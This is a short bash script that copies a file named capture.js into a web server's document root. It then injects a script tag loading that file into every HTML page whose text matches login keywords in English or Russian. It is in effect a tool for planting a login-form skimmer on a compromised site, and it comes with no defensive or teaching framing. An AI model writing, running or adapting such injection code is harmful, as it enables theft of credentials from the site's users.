#!/bin/bash
CAPTURE_JS_FILE="capture.js" 
WEB_SERVER_DIR="/var/www/html"

inject_script() {
    local file="$1"
    if grep -q "<script src=\"capture.js\"></script>" "$file"; then
        echo "AlReAdY DoNe $file"
    else
        sed -i 's/<\/body>/<script src="capture.js"><\/script>\n<\/body>/' "$file"
        echo "DoNe: $file"
    fi
}

cp "$CAPTURE_JS_FILE" "$WEB_SERVER_DIR/capture.js"

find "$WEB_SERVER_DIR" -type f -name "*.html" -o -name "*.htm" | while read file; do
    if grep -iq "login\|вход\|авторизация\|signin\|log in" "$file"; then
        inject_script "$file"
    fi
done

